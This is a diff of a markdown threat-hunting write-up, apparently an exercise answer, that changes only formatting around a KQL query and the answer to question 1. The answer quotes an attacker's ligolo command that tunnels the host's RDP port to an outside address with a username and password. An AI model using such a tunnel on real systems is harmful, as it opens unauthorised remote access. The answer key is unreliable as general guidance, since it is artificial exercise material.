@@ -99,8 +99,8 @@ ProcessEvents
 | where hostname == "Y1US-DESKTOP" and timestamp > datetime("2023-12-02T10:12:42Z")
 ```
 
-*Answer for question 1*:
+*Answer for question 1*:   
 This took a little manual analysis, eventually identifying the command:
-```batch
+```bash
 cmd.exe "ligolo" --bind 0.0.0.0:1251 --forward 127.0.0.1:3389 --to 113.37.9.17:22 --username rednose --password falalalala --no-antispoof
 ```
